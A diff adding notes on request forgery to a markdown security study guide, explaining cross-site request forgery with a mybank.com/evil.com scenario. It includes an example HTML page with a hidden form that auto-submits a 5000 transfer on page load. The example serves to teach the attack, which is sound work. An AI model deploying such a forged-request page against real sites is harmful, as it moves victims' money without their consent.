@@ -787,7 +787,26 @@ Definition: Identify, prioritize and remediate vulnerabilities in your environme
       * Input validation and escaping
       * [OWASP Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 * **Request Forgery**
+  * Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types.
   * **Cross-Site Request Forgery CSRF/XSRF**
+    * Assume you are logged in to `mybank.com`.
+    * You then visit a dangerous site or link `evil.com`
+    * When you click on a button on `evil.com` it might trigger a request to `mybank.com`
+    * If you are stil loggedin to `mybank.com`, the request could succeed because the browser would use any cookies linked to the `mybank.com` site.
+    * Example HTMl on the `evil.com` site
+    ```html
+    <!-- Hidden on evilsite.com -->
+    <form action="https://mybank.com/transfer" method="POST" id="malicious-form">
+        <input type="hidden" name="to_account" value="999999">
+        <input type="hidden" name="amount" value="5000">
+        <!-- Note: no CSRF token! -->
+    </form>
+
+    <script>
+        // Automatically submit when page loads
+        document.getElementById('malicious-form').submit();
+    </script>
+    ```
   * **Server-Side Request Forgery SSRF**
 
 ### Application Security Controls
